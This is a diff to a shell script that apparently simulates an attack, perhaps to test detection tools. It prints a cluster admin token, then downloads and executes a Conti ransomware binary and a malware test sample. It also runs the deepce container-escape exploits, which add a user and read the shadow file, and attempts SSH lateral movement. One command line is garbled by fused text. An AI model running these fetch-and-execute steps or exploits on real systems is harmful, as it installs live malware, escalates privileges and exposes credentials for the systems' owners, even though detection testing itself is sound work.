@@ -73,7 +73,25 @@ echo "Cluster Admin Token is: "
 cat /tmp/token 
 
 # Download sample malware
-echo "Download & launch malware"
+echo "Downloading elf malware"
 wget wildfire.paloaltonetworks.com/publicapi/test/elf
-chmod 755 elf
+chmod +x elf
 ./elf
+
+# Download conti malware
+echo "Downloading Conti-C2 malware"
+wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
+chmod +x conti.sh
+./conti.sh
+
+# container enumeration
+echo "Downloading container enumeration and exploits"
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O deepce.sh
+chmod +x deepce.sh
+./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
+./deepce.sh --no-enumeration --exploit SOCK --shadow
+./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh
+
+# Lateral Movement 
+echo "Attempting SSH to target machine..."
+ssh user@target-machine || echo "[!] SSH to target failed - Continuing..."
